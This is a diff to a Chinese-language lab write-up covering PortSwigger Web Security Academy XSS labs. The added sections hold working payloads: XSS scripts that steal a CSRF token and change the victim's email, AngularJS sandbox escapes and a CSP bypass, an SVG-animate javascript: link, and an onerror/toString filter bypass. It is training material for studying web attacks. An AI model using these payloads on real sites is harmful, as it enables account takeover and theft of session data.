@@ -325,7 +325,7 @@
 <pre><code>/product?productId=1&amp;storeId=&lt;script&gt;alert(window.origin)&lt;/script&gt;
 </code></pre><h2 id="lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a> in AngularJS expression with angle brackets and double quotes HTML-encoded</h2>
 <p>url&#x53C2;&#x6570;&#x5728;<code>&gt;&lt;</code>&#x4E2D;&#x95F4;&#xFF0C;&#x5C16;&#x62EC;&#x53F7;&#x8F6C;&#x4E49;&#x3002;&#x65E0;&#x6CD5;&#x9003;&#x51FA;</p>
-<p>&#x800C;&#x7531;&#x4E8E;AngularJS&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x53EF;&#x4EE5; front-end SSTI</p>
+<p>&#x800C;&#x7531;&#x4E8E;AngularJS&#x7684;&#x5F15;&#x5165;&#xFF0C;&#x53EF;&#x4EE5; CSTI</p>
 <pre><code>{{$on.constructor(&apos;alert(window.origin)&apos;)()}}
 </code></pre><p>&#x53E6;&#x5916; AngularJS gadget (SSTI)&#x8FD8;&#x53EF;&#x4EE5;&#x7528;&#x6765; bypass CSP &#x3002;payload &#x6536;&#x96C6;&#xFF1A;<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md</a> &#x4EE5;&#x53CA; <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected</a></p>
 <h2 id="lab-reflected-dom-xss">Lab: Reflected <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a></h2>
@@ -407,7 +407,7 @@
 </code></pre><p>&#x7531;&#x4E8E;&#x8FD9;&#x4E2A;<code>-</code>&#x4EC5;&#x4EC5;&#x662F;&#x8BA1;&#x7B97;&#x7B26;&#x53F7;&#xFF0C;&#x6539;&#x6210;<code>*</code>&#x6216;<code>/</code>&#x90FD;&#x884C;&#x3002;&#x800C;<code>+</code>&#x56E0;&#x4E3A;&#x4F1A;&#x88AB; http &#x534F;&#x8BAE;&#x8BA4;&#x4F5C;&#x7A7A;&#x683C;&#x6240;&#x4EE5;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x5229;&#x7528;&#x3002;&#x6539;&#x6210;<code>%2B</code>&#x5C31;&#x53EF;&#x4EE5;&#x4E86;</p>
 <pre><code>\&quot;%2Balert()}//
 </code></pre><h2 id="lab-stored-dom-xss">Lab: Stored <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based" target="_blank">DOM XSS</a></h2>
-<p>&#x968F;&#x4FBF;&#x70B9;&#x4E00;&#x4E2A;&#x6587;&#x7AE0;<code>Ctrl + U</code>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x3002;&#x524D;&#x7AEF;&#x6E32;&#x67D3;</p>
+<p>&#x968F;&#x4FBF;&#x70B9;&#x4E00;&#x4E2A;&#x6587;&#x7AE0;<code>Ctrl + U</code>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6CA1;&#x6709;&#x8BC4;&#x8BBA;&#x3002;&#x53EF;&#x4EE5;&#x5224;&#x65AD;&#x4E3A;&#x524D;&#x7AEF;&#x6E32;&#x67D3;</p>
 <pre><code class="lang-js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadComments</span>(<span class="hljs-params">postCommentPath</span>) </span>{
     <span class="hljs-keyword">let</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();
     xhr.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{
@@ -574,6 +574,95 @@ body:username.value+&apos;:&apos;+this.value
 });&quot;</span>&gt;</span>
 </code></pre>
 <p>HTML&#x6CE8;&#x5165;&#x1F914;&#x4EE5;&#x524D;&#x6CA1;&#x770B;&#x8FC7;&#x3002;&#x4E0D;&#x8FC7;&#x4E5F;&#x786E;&#x5B9E;&#x662F;&#x4E00;&#x79CD;&#x62FF;&#x5BC6;&#x7801;&#x7684;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x3002;</p>
+<h2 id="lab-exploiting-xss-to-perform-csrf">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting" target="_blank">Exploiting XSS</a> to perform CSRF</h2>
+<p>&#x5229;&#x7528; XSS &#x5230; CSRF&#x3002;&#x56E0;&#x4E3A;&#x6709; csrf token &#x6240;&#x4EE5;&#x8981;&#x7279;&#x522B;&#x5904;&#x7406;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+(<span class="hljs-keyword">async</span>() =&gt; {
+    <span class="hljs-keyword">var</span> email = <span class="hljs-string">&apos;gtg@thebearhimself.rest&apos;</span>;
+    <span class="hljs-keyword">var</span> csrf = <span class="hljs-keyword">await</span> fetch(<span class="hljs-string">&apos;/my-account&apos;</span>)
+        .then((response)=&gt;{<span class="hljs-keyword">return</span> response.text();})
+        .then((html)=&gt;{<span class="hljs-keyword">return</span> html.match(<span class="hljs-regexp">/(?&lt;=value\=&quot;)[A-Za-z0-9]+(?=&quot;)/</span>)[<span class="hljs-number">0</span>];});
+    fetch(<span class="hljs-string">&apos;/my-account/change-email&apos;</span>,{
+        method: <span class="hljs-string">&apos;POST&apos;</span>,
+        mode: <span class="hljs-string">&apos;no-cors&apos;</span>,
+        headers: {
+            <span class="hljs-string">&apos;Content-Type&apos;</span>: <span class="hljs-string">&apos;application/x-www-form-urlencoded&apos;</span>
+        },
+        body: <span class="hljs-string">`email=<span class="hljs-subst">${email}</span>&amp;csrf=<span class="hljs-subst">${csrf}</span>`</span>
+    })
+})();
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p><del>tbh &#x56E0;&#x4E3A;console&#x548C;page&#x7684;&#x5F02;&#x6B65;&#x5DEE;&#x5F02;&#x5361;&#x4E86;&#x8BB8;&#x4E45;</del></p>
+<p>&#x9898;&#x89E3;&#x7ED9;&#x7684;&#x7528;&#x7684;&#x662F;&#x53E4;&#x8001;&#x7684;<code>XMLHttpRequest</code>api&#xFF1A;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
+<span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> XMLHttpRequest();
+req.onload = handleResponse;
+req.open(<span class="hljs-string">&apos;get&apos;</span>,<span class="hljs-string">&apos;/my-account&apos;</span>,<span class="hljs-literal">true</span>);
+req.send();
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleResponse</span><span class="hljs-params">()</span> </span>{
+    <span class="hljs-keyword">var</span> token = <span class="hljs-keyword">this</span>.responseText.match(/name=<span class="hljs-string">&quot;csrf&quot;</span> value=<span class="hljs-string">&quot;(\w+)&quot;</span>/)[<span class="hljs-number">1</span>];
+    <span class="hljs-keyword">var</span> changeReq = <span class="hljs-keyword">new</span> XMLHttpRequest();
+    changeReq.open(<span class="hljs-string">&apos;post&apos;</span>, <span class="hljs-string">&apos;/my-account/change-email&apos;</span>, <span class="hljs-literal">true</span>);
+    changeReq.send(<span class="hljs-string">&apos;csrf=&apos;</span>+token+<span class="hljs-string">&apos;&amp;email=test@test.com&apos;</span>)
+};
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<h2 id="lab-reflected-xss-with-angularjs-sandbox-escape-without-strings">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> with AngularJS sandbox escape without strings</h2>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">angular.module(<span class="hljs-string">&apos;labApp&apos;</span>, []).controller(<span class="hljs-string">&apos;vulnCtrl&apos;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">($scope, $parse)</span> </span>{
+$scope.query = {};
+<span class="hljs-keyword">var</span> key = <span class="hljs-string">&apos;search&apos;</span>;
+$scope.query[key] = <span class="hljs-string">&apos;123&apos;</span>;
+$scope.value = $parse(key)($scope.query);
+});</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">ng-controller</span>=<span class="hljs-string">vulnCtrl</span>&gt;</span>0 search results for <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
+</code></pre>
+<p>$scope &#x7528;&#x4E8E;&#x89C4;&#x8303;&#x5F53;&#x524D;&#x4F5C;&#x7528;&#x57DF;&#xFF08;&#x6CA1;&#x641C;&#x5230; &#x5E94;&#x8BE5;&#x662F;&#x548C;&#x8FD9;&#x4E2A;controller&#x76F8;&#x5173;&#x7684;</p>
+<p><a href="https://docs.angularjs.org/api/ng/service/$parse" target="_blank">$parse</a> &#x7684;&#x529F;&#x80FD;&#x662F;&#x5C06; AngularJS &#x8868;&#x8FBE;&#x5F0F;&#x8F6C;&#x6362;&#x4E3A;&#x51FD;&#x6570;&#x3002;&#x7C7B;&#x4F3C; JS &#x4E2D; function constructor &#x7684;&#x611F;&#x89C9;</p>
+<p>&#x901A;&#x8FC7;&#x539F;&#x578B;&#x8BBE;&#x7F6E;<code>String.charAt</code>&#x7834;&#x574F;&#x6C99;&#x7BB1;&#x903B;&#x8F91;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x7EC4;&#x4F20;&#x9012;&#x7ED9; orderBy &#x8FC7;&#x6EE4;&#x5668;&#x3002;&#x518D;&#x6B21;&#x4F7F;&#x7528; toString() &#x521B;&#x5EFA;&#x5B57;&#x7B26;&#x4E32;&#x548C; String &#x6784;&#x9020;&#x51FD;&#x6570;&#x5C5E;&#x6027;&#x6765;&#x8BBE;&#x7F6E;&#x8FC7;&#x6EE4;&#x5668;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x518D;&#x4F7F;&#x7528;<code>fromCharCode</code>&#x65B9;&#x6CD5;&#x901A;&#x8FC7;&#x5C06;&#x5B57;&#x7B26;&#x4EE3;&#x7801;&#x8F6C;&#x6362;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;<code>x=alert(1)</code>&#x6765;&#x751F;&#x6210; payload&#x3002;</p>
+<pre><code class="lang-js">?search=<span class="hljs-number">1</span>&amp;toString().constructor.prototype.charAt%<span class="hljs-number">3</span>d[].join;[<span class="hljs-number">1</span>]|orderBy:toString().constructor.fromCharCode(<span class="hljs-number">120</span>,<span class="hljs-number">61</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>)=<span class="hljs-number">1</span>
+</code></pre>
+<p><del>&#x6709;&#x70B9;&#x96BE;&#x3001;&#x4E5F;&#x8BB8;&#x5E94;&#x8BE5;&#x5148;&#x8BFB;&#x4E00;&#x8BFB; AngularJS &#x6E90;&#x7801;</del></p>
+<h2 id="lab-reflected-xss-with-angularjs-sandbox-escape-and-csp">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> with AngularJS sandbox escape and CSP</h2>
+<pre><code class="lang-htaccess">Content-Security-Policy: 
+default-src &apos;self&apos;; script-src &apos;self&apos;; style-src &apos;unsafe-inline&apos; &apos;self&apos;
+</code></pre>
+<p>script &#x6307;&#x5B9A;&#x4E86;&#x4EC5;&#x540C;&#x6E90;</p>
+<p>&#x9898;&#x89E3;&#x901A;&#x8FC7; hash &#x89E6;&#x53D1; AngularJS &#x4E2D;&#x7684;<code>ng-focus</code>&#x3002;payload&#x4E2D;&#x5192;&#x53F7;&#x8868;&#x793A;&#x6B63;&#x5728;&#x53D1;&#x9001;&#x5230;&#x8FC7;&#x6EE4;&#x5668;&#x7684;&#x53C2;&#x6570;&#x3002;&#x5728;&#x53C2;&#x6570;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x76F4;&#x63A5;&#x8C03;&#x7528;&#x8B66;&#x62A5;&#x51FD;&#x6570;&#xFF0C;&#x800C;&#x662F;&#x5C06;&#x5176;&#x5206;&#x914D;&#x7ED9;&#x53D8;&#x91CF; z&#x3002;&#x4EC5;&#x5F53; orderBy &#x64CD;&#x4F5C;&#x5230;&#x8FBE; $event.path &#x6570;&#x7EC4;&#x4E2D;&#x7684; window &#x5BF9;&#x8C61;&#x65F6;&#x624D;&#x4F1A;&#x8C03;&#x7528;&#x8BE5;&#x51FD;&#x6570;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x5B83;&#x53EF;&#x4EE5;&#x5728;&#x7A97;&#x53E3;&#x8303;&#x56F4;&#x5185;&#x8C03;&#x7528;&#xFF0C;&#x800C;&#x65E0;&#x9700;&#x663E;&#x5F0F;&#x5F15;&#x7528;<code>window</code>&#x5BF9;&#x8C61;&#xFF0C;&#x4ECE;&#x800C;&#x6709;&#x6548;&#x5730;&#x7ED5;&#x8FC7; AngularJS &#x7684;<code>window</code>&#x68C0;&#x67E5;&#x3002;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
+location.href=<span class="hljs-string">&quot;https://0a580013046fcd29842ff495005000f3.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x&quot;</span>
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<h2 id="lab-reflected-xss-with-event-handlers-and-href-attributes-blocked">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> with event handlers and <code>href</code> attributes blocked</h2>
+<p>&#x9650;&#x5236;&#x4E86;href&#x5C5E;&#x6027;&#x4F46;&#x662F;&#x8981;&#x505A;&#x5230; Click button &#x5229;&#x7528;&#x3002;&#x901A;&#x8FC7; svg:animate &#x8BBE;&#x7F6E;&#x989D;&#x5916;&#x7684;&#x53C2;&#x6570;&#x3002;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animate</span> <span class="hljs-attr">attributeName</span>=<span class="hljs-string">href</span> <span class="hljs-attr">values</span>=<span class="hljs-string">javascript:alert(1)</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">20</span> <span class="hljs-attr">y</span>=<span class="hljs-string">20</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+</code></pre>
+<pre><code class="lang-html">https://0a750087032fc49e810b346d00650005.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
+</code></pre>
+<h2 id="lab-reflected-xss-in-a-javascript-url-with-some-characters-blocked">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> in a JavaScript URL with some characters blocked</h2>
+<p>&#x53CD;&#x5C04;&#x578B;&#x4F46;&#x662F;&#x4E0D;&#x518D;&#x6709;<code>search</code>&#x670D;&#x52A1;&#x4E86;&#x3002;&#x53EA;&#x80FD;&#x901A;&#x8FC7;<code>post</code>&#x754C;&#x9762;&#x6765;&#x8FBE;&#x6210;</p>
+<p>&#x540E;&#x7AEF;&#x4F1A;&#x5C06; GET &#x53C2;&#x6570;&#x6E32;&#x67D3;&#x51FA;&#x4E00;&#x4E2A; a &#x5143;&#x7D20;&#x51FA;&#x6765;&#x3002;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:fetch(&apos;/analytics&apos;, {method:&apos;post&apos;,body:&apos;&lt;encodeURIComponent(input)&gt;&apos;}).finally(_ =&gt; window.location = &apos;/&apos;)&quot;</span>&gt;</span>Back to Blog<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+</code></pre>
+<p>&#x4E0D;&#x8FC7;&#x8FD9;&#x4E2A;&#x7F16;&#x7801;&#x4E0D;&#x7528;&#x7BA1;&#x3002;&#x6BD5;&#x7ADF;&#x662F; javascript &#x4F2A;&#x534F;&#x8BAE;&#xFF0C;&#x63D0;&#x53D6;&#x65F6;&#x4F1A;&#x89E3;&#x7801;&#x4E00;&#x6B21;&#x3002;&#x7B80;&#x5355;&#x6D4B;&#x8BD5;&#x53EF;&#x4EE5;&#x77E5;&#x9053;block&#x6389;&#x4E86;&#x7A7A;&#x683C;&#x548C;&#x62EC;&#x53F7;&#x548C;&#x5206;&#x53F7;</p>
+<p>&#x95ED;&#x5408;&#x524D;&#x534A; json&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<code>,</code>&#x8FD0;&#x7B97;&#x7B26;&#x7684;&#x65B9;&#x5F0F;&#x6267;&#x884C;&#x591A;&#x4E2A;&#x8868;&#x8FBE;&#x5F0F;&#x3002;&#x8981;&#x7ED5;&#x8FC7;&#x62EC;&#x53F7;&#x7684;&#x9650;&#x5236;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x8986;&#x76D6; js runtime &#x9690;&#x5F0F;&#x6267;&#x884C;&#x7684;&#x51FD;&#x6570;&#x3001;&#x914D;&#x5408; throw error &#x6765;&#x5B9E;&#x73B0;&#x3002;</p>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventSource/error_event" target="_blank">onerror</a> &#x65B9;&#x6CD5;&#x7528;&#x4E8E;&#x81EA;&#x5B9A;&#x4E49;&#x9519;&#x8BEF;&#x5904;&#x7406;&#xFF0C;&#x4E0E;<code>Error.prepareStackTrace</code>&#x4E0D;&#x540C;&#x7684;&#x662F;&#x5B83;&#x4EC5;&#x9002;&#x7528;&#x4E8E;&#x6D4F;&#x89C8;&#x5668;&#x3002;&#x5B83;&#x4F3C;&#x4E4E;&#x4E0E;<code>EventSource</code>&#x7684; onerror &#x6709;&#x533A;&#x522B;&#xFF08;&#xFF1F;</p>
+<pre><code class="lang-js">/post?postId=<span class="hljs-number">5</span>&amp;<span class="hljs-string">&apos;},x=x=&gt;{throw/**/onerror=alert,1337},toString=x,window+&apos;</span><span class="hljs-string">&apos;,{a:&apos;</span>
+</code></pre>
+<p>&#x8986;&#x76D6;&#x4E86;<code>onerror</code>&#x548C;<code>toString</code>&#x3002;&#x5728;&#x8C03;&#x7528;<code>window+&apos;&apos;</code>&#x65F6;&#x4F1A;&#x9690;&#x5F0F;&#x6267;&#x884C;<code>toString</code>&#xFF0C;<code>toString</code>&#x6267;&#x884C;&#x89E6;&#x53D1;&#x62A5;&#x9519;&#xFF0C;throw &#x51FA;&#x4E00;&#x4E2A; 1337 &#x88AB;<code>onerror</code>&#x63A5;&#x6536;&#x6210;&#x4E3A;&#x53C2;&#x6570;&#x6267;&#x884C;&#x3002;&#x8FD8;&#x86EE;&#x795E;&#x5947;&#x7684;u1s1</p>
+<p>&#x683C;&#x5F0F;&#x5316;&#x540E;&#x7684; payload &#x957F;&#x8FD9;&#x6837;</p>
+<pre><code class="lang-js">fetch(<span class="hljs-string">&apos;/analytics&apos;</span>, {
+    method: <span class="hljs-string">&apos;post&apos;</span>,
+    body: <span class="hljs-string">&apos;/post?postId=5&amp;&apos;</span>
+}, x = x=&gt;{
+    <span class="hljs-keyword">throw</span> <span class="hljs-comment">/**/</span>
+    EventSource.onerror = alert,
+    <span class="hljs-number">1337</span>
+}
+, toString = x, <span class="hljs-built_in">window</span> + <span class="hljs-string">&apos;&apos;</span>, {
+    a: <span class="hljs-string">&apos;&apos;</span>
+}).finally(_=&gt;<span class="hljs-built_in">window</span>.location = <span class="hljs-string">&apos;/&apos;</span>)
+</code></pre>
 
                                 
                                 </section>
@@ -617,7 +706,7 @@ body:username.value+&apos;:&apos;+this.value
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"webacademy XSS","level":"1.3","depth":1,"next":{"title":"WMCTF2023 web writeup","level":"1.4","depth":1,"anchor":"#20230824","path":"WMCTF 2023 web writeup.md","ref":"WMCTF 2023 web writeup.md#20230824","articles":[]},"previous":{"title":"羊城杯 2023 web writeup","level":"1.2","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"webacademy XSS.md","mtime":"2023-09-15T13:49:33.489Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-15T15:14:13.775Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"webacademy XSS","level":"1.3","depth":1,"next":{"title":"WMCTF2023 web writeup","level":"1.4","depth":1,"anchor":"#20230824","path":"WMCTF 2023 web writeup.md","ref":"WMCTF 2023 web writeup.md#20230824","articles":[]},"previous":{"title":"羊城杯 2023 web writeup","level":"1.2","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"webacademy XSS.md","mtime":"2023-09-25T18:44:42.106Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-25T18:46:16.702Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
